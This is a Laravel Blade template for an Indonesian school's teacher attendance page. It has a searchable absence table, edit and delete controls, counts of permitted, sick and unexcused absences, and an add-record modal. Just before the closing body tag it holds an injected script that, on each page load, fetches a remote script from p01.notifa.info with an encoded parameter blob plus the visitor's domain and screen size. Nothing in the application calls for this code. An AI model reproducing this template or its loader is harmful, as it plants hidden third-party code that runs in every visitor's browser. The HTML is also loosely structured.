


 @extends('layouts.petugas')
@section('content')
<style type="text/css">
    #myInput {
    background-image: url('/css/searchicon.png'); /* Add a search icon to input */
    background-position: 10px 12px; /* Position the search icon */
    background-repeat: no-repeat; /* Do not repeat the icon image */
    width: 30%; /* Full-width */
    font-size: 16px; /* Increase font-size */
    padding: 12px 20px 12px 40px; /* Add some padding */
    border: 1px solid #ddd; /* Add a grey border */
    margin-bottom: 12px; /* Add some space below the input */
}

#myTable {
    width: 100%; /* Full-width */
    font-size: 18px; /* Increase font-size */
}

#myTable th, #myTable td {
    text-align: left; /* Left-align text */
    padding: 12px; /* Add padding */
}

#myTable tr {
    /* Add a bottom border to all table rows */
  
}

#myTable tr.header, #myTable tr:hover {
    /* Add a grey background color to the table header and on hover */
    background-color: #000000;
}
</style>

<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SISTEM ABSENSI REAL TIME</title>

    <!-- Core CSS - Include with every page -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="font-awesome/css/font-awesome.css" rel="stylesheet">

 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" ></script>
</head>

<body>

                    <div class="panel panel-default">
                        <div class="panel-heading">
                       
                        </div>
<script>
function myFunction() {
  // Declare variables 
  var input, filter, table, tr, td, i;
  input = document.getElementById("myInput");
  filter = input.value.toUpperCase();
  table = document.getElementById("myTable");
  tr = table.getElementsByTagName("tr");

  // Loop through all table rows, and hide those who don't match the search query
  for (i = 0; i < tr.length; i++) {
    td = tr[i].getElementsByTagName("td")[2];
    if (td) {
      if (td.innerHTML.toUpperCase().indexOf(filter) > -1) {
        tr[i].style.display = "";
      } else {
        tr[i].style.display = "none";
      }
    } 
  }
}
</script>
<input type="text" id="myInput" onkeyup="myFunction()" placeholder="Cari Nama Guru..">


<hr>
                                <table  id="myTable" class="table">
  
                                        
 <button type="button" class="btn btn-success" data-toggle="modal" data-target="#myModal">Tambah Data</button>


<tr>
<th colspan="5" class="text-center success">no</th>    
<th colspan="5" class="text-center success">tanggal</th>    
<th  colspan="5" class="text-center success">Nama Guru</th>
<th  colspan="5" class="text-center success">keterangan</th>
<th  colspan="5" class="text-center success">Nama Petugas</th>

<th  colspan="5" class="text-center success">Action</th>

</tr>
                        
<tr>
    <tbody id="absensi_siswa">
                        @php $no = 1; @endphp
                     
                        @foreach($absensi_guru as $data)
<td colspan="5" class="text-center success">{{ $no++ }}</td>
<td colspan="5" class="text-center">{{ $data->tanggal }}</td>
<td colspan="5" class="text-center">{{ $data->guru->Nama }}</td>
<td colspan="5" class="text-center">{{ $data->keterangan }}</td>
<td colspan="5" class="text-center">{{ $data->nama_petugas }}</td>
                        <td>
                            <a class="btn btn-warning" href="{{ route('absensi_guru.edit',$data->id) }}">Edit</a>
                        </td>
                        <td>
                            <form method="post" action="{{ route('absensi_guru.destroy',$data->id) }}">
                                <input name="_token" type="hidden" value="{{ csrf_token() }}">
                                <input type="hidden" name="_method" value="DELETE">

                                <button type="submit" class="btn btn-danger">Delete</button>
                            </form>
                        </td>
                     
                        
</tr>

   @endforeach  
        
    </tbody>          
                                </table>

                            </div>




                            <!-- /.table-responsive -->
                           {{--  <div class="well">
                                <h4>Keterangan Absensi</h4>
                                <p>A = Tidak Masuk Tanpa Keterangan</p>
                                <p>I = Tidak Masuk Ada Surat Ijin Atau Pemberitahuan</p>
                                <p>S = Tidak Masuk Ada Surat Dokter Atau Pemberitahuan</p>
                                <p>H = Hadir</p>
                                <p>N = Belum Ada Keterangan Absensi</p>
                        
                            </div>
                        --}} </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
      
<table class="tabelss table-striped table-bordered table-hover">
<tr>
<th  colspan="5" class="text-center success">Izin</th>
<th  colspan="5" class="text-center success">Alfa</th>
<th  colspan="5" class="text-center success">Sakit</th>
</tr>

<tr>
<td colspan="5" class="text-center">{{ $jumlahIzin }}</td>
<td colspan="5" class="text-center">{{ $jumlahAlfa }}</td>
<td colspan="5" class="text-center">{{ $jumlahSakit }}</td>

</tr>
</table>


    <script src="js/jquery-1.10.2.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/plugins/metisMenu/jquery.metisMenu.js"></script>

    <!-- Page-Level Plugin Scripts - Tables -->
    <script src="js/plugins/dataTables/jquery.dataTables.js"></script>
    <script src="js/plugins/dataTables/dataTables.bootstrap.js"></script>

    <!-- SB Admin Scripts - Include with every page -->
    <script src="js/sb-admin.js"></script>

    <!-- Page-Level Demo Scripts - Tables - Use for reference -->
    <script>
    $(document).ready(function() {
        $('#dataTables-example').dataTable();
    });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mLjcjWn%2bvCNaJ85cVa7QpLexe2F3tjA0kdh4v0bUhBXB%2bTKh9mk5nopbRFTkfQfeIMLMGLBY1jTK9XcL4%2fnBrZWhmQoC3kzoPe5MPfKT59U9mXOWsfHC4S%2bOZPL5wPtvSCtljRSLBOPFJTexgl8o%2bi%2fsPKy4wxY7gxJPgf9I7TSgJmEcA3j29byq8ONfHAtGoAQAB8A2mgS%2bZoqdSmS6In3PRsWqzjE7tbfC%2fGztDF6fjFyZkJBcIRz4aZrGgUnnVOUVPlCESepDO8FVwc8ns2xEveWjyIbRps4AWKTOW8DVempi2PlBiKwhpLMg%2b1wwV8hitWGX4iHWzO8zK4hu%2fTKignfEAV4%2fzVIXNeKy8LQt09rxmWUV1TwuHU0Kp4mq9z9GlJBOPTpf7wmgxEXRm7eKjovuSNryyYgHOPd3U8MORMeWOAkPS8tzAwZjmqJehKL4GvvCuIN%2bUSVt0NHrJJ6pA2pSvTg5CDVPiilVAUx%2bUO%2ftJrLHR1MtfYCdnY0MjRhJWVhX%2bfm0C3XDL%2br%2blTit7U9UkrTy5OrJOMz%2fM9pjBFhixWV1tdVyfddYqoXKnkpPtMJCQqknbwmp%2fKWG%2bYRPAu3VXtWMc" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
<div id="myModal" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <h4 class="modal-title">Tambah Data</h4>
      <br>
        <button type="button" class="close" data-dismiss="modal">&times;<br> </button>
        <br>
       </div>
      <div class="modal-body">
  <form action="{{route('absensi_guru.store')}}" method="post">
                            {{csrf_field()}}

                   
                    <div class="form-group {{ $errors->has('id_guru') ? ' has-error' : '' }}">
                                <label class="control-label">Nama guru </label>    
                                <select name="id_guru" class="form-controll" 
                                id="namaguru">
                                <option>Pilih guru</option>
                                @foreach($guru as $data)
                                    <option value="{{ $data->id }}">
                                        {{ $data->Nama }}|{{ $data->Nik }}</option>
                            @endforeach
                        </select>
                        @if ($errors->has('id_guru'))
                            <span class="help-block">
                                <strong>{{ $errors->first('id_guru') }}</strong>
                            </span>
                        @endif
                    </div>
                    

                    

                    <div class="form-group {{$errors->has('tanggal') ? 'has-error' : ''}}">
                                <label class="control-label">Tanggal</label>
                                <input type="date" class="form-controll" name="tanggal" required>
                                @if ($errors->has('tanggal'))
                                    <span class="help-blocks">
                                        <strong>{{$errors->first('tanggal')}}</strong>
                                    </span>
                                @endif
                            </div>

                    <div class="form-group {{$errors->has('keterangan') ? 'has-error' : ''}}">
                                <label class="control-label">keterangan</label><br>
                                <input type="radio" class="radio-control" name="keterangan" value="Izin">Izin&nbsp&nbsp
                                <input type="radio" class="radio-control" name="keterangan"  value="Sakit">Sakit&nbsp&nbsp
                                <input type="radio" class="radio-control" name="keterangan"  value="Alfa">Alfa
                                @if ($errors->has('keterangan'))
                                    <span class="help-blocks">
                                        <strong>{{$errors->first('keterangan')}}</strong>
                                    </span>
                                @endif

                            </div>
<div class="form-group {{ $errors->has('id_user') ? 'has error' : '' }}">
                        <select name="id_user" class="form-controll" id="userGuru">
                            <option>Pilih Nama User Guru</option>
                            @foreach($user as $data)
                            <option value="{{ $data->id }}">{{ $data->name }}</option>
                            @endforeach
                        </select>
                        @if ($errors->has('id_user'))
                        <span class="help-block">
                            <strong>{{ $errors->first('id_user') }}</strong>
                        </span>
                        @endif
                    </div>

                    
                    <div class="form-group {{ $errors->has('nama_petugas') ? ' has-error' : '' }}">
                                  
                    <input  type="hidden" name="nama_petugas" 
                    class="form-controll" value="{{ Auth::user()->name }}">
                        @if ($errors->has('nama_petugas'))
                            <span class="help-block">
                                <strong>{{ $errors->first('nama_petugas') }}</strong>
                            </span>
                        @endif
                    </div>
                    
                                  <div class="form-group">
                <button type="submit" class="btn btn-danger">Submit</button>

                <button type="submit" class="btn btn-warning">Reset</button>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
        </form>
    </div>
<script src="{{ asset('js/jquery.min.js') }}"></script>
<script type="text/javascript">
    $(document).ready(function(){
        $('#namaguru').change(function() {
            $('#userGuru').html('');
            $.ajax({
                method : 'GET',
                dataType: 'html',
                url : 'filter/userGuru/' + $(this).val(),
                success : function(data){
                    $('#userGuru').append(data);
                },
                error : function() {
                    $('#userGuru').html('Tidak Ada Hasil');
                }

            });         
        });
        $('#class').change(function() {
            $('#name').html('');
            $.ajax({
                method : 'GET',
                dataType: 'html',
                url : 'filter/userGuru/' + $(this).val(),
                success : function(data){
                    $('#name').append(data);
                },
                error : function() {
                    $('#name').html('Tidak Ada Hasil');
                }

            });         
        })
    });
</script>


@endsection
